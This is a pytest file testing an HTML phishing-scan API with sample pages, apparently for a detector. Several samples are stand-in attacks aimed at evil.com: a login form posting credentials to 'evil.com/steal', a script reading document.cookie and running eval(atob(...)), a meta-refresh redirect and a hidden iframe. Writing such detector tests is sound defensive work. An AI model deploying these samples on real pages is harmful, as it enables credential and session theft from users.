"""Tests for HTML scan endpoint (Section 3)."""

from __future__ import annotations


def test_html_scan_safe(client):
    """Benign HTML should be classified as safe."""
    html = "<html><head><title>Hello</title></head><body><p>Welcome!</p></body></html>"
    resp = client.post("/api/scans/html", json={"html": html})
    assert resp.status_code == 200
    data = resp.json()
    assert data["scan_type"] == "html"
    assert data["prediction"] in ("safe", "suspicious", "phishing")
    assert 0 <= data["risk_score"] <= 100
    assert data["confidence"] is None
    assert isinstance(data["indicators"], list)
    assert data["model"]


def test_html_scan_password_form(client):
    """HTML with a password form should flag credential indicators."""
    html = """
    <html><body>
      <form action="http://evil.com/steal" method="post">
        <input type="text" name="username" placeholder="Email" />
        <input type="password" name="password" />
        <input type="submit" value="Login" />
      </form>
    </body></html>
    """
    resp = client.post("/api/scans/html", json={"html": html})
    assert resp.status_code == 200
    data = resp.json()
    assert data["risk_score"] >= 30
    indicator_names = {i["name"] for i in data["indicators"]}
    assert "password_input" in indicator_names


def test_html_scan_suspicious_javascript(client):
    """HTML with suspicious JavaScript should flag it."""
    html = """
    <html><body>
      <script>
        var x = document.cookie;
        eval(atob('aGVsbG8='));
        window.location = 'http://evil.com';
      </script>
    </body></html>
    """
    resp = client.post("/api/scans/html", json={"html": html})
    assert resp.status_code == 200
    data = resp.json()
    assert data["risk_score"] >= 20
    indicator_names = {i["name"] for i in data["indicators"]}
    assert "suspicious_javascript" in indicator_names


def test_html_scan_meta_redirect(client):
    """HTML with a meta-refresh redirect should flag it."""
    html = '<html><head><meta http-equiv="refresh" content="0;url=http://evil.com"></head></html>'
    resp = client.post("/api/scans/html", json={"html": html})
    assert resp.status_code == 200
    data = resp.json()
    indicator_names = {i["name"] for i in data["indicators"]}
    assert "meta_redirect" in indicator_names


def test_html_scan_hidden_iframe(client):
    """HTML with a hidden iframe should flag it."""
    html = '<html><body><iframe src="http://evil.com" width="0" height="0"></iframe></body></html>'
    resp = client.post("/api/scans/html", json={"html": html})
    assert resp.status_code == 200
    data = resp.json()
    indicator_names = {i["name"] for i in data["indicators"]}
    assert "hidden_iframe" in indicator_names


def test_html_scan_form_to_ip(client):
    """Form submitting to an IP address should flag it."""
    html = '<html><body><form action="http://192.168.1.1/submit"><input type="password"></form></body></html>'
    resp = client.post("/api/scans/html", json={"html": html})
    assert resp.status_code == 200
    data = resp.json()
    indicator_names = {i["name"] for i in data["indicators"]}
    assert "form_to_ip" in indicator_names or "external_form_action" in indicator_names


def test_html_scan_empty_body(client):
    """Empty HTML should return 422."""
    resp = client.post("/api/scans/html", json={"html": ""})
    assert resp.status_code == 422


def test_html_scan_blank_body(client):
    """Whitespace-only HTML should return 422."""
    resp = client.post("/api/scans/html", json={"html": "   "})
    assert resp.status_code == 422


def test_html_scan_malformed(client):
    """Malformed HTML should be handled gracefully without server error."""
    html = "<html><body><div>unclosed<p>tags<form><input"
    resp = client.post("/api/scans/html", json={"html": html})
    assert resp.status_code == 200
    data = resp.json()
    assert data["scan_type"] == "html"


def test_html_scan_brand_impersonation(client):
    """HTML referencing known brands should flag it."""
    html = "<html><head><title>PayPal Login</title></head><body><h1>Sign in to your PayPal account</h1></body></html>"
    resp = client.post("/api/scans/html", json={"html": html})
    assert resp.status_code == 200
    data = resp.json()
    indicator_names = {i["name"] for i in data["indicators"]}
    assert "brand_reference" in indicator_names
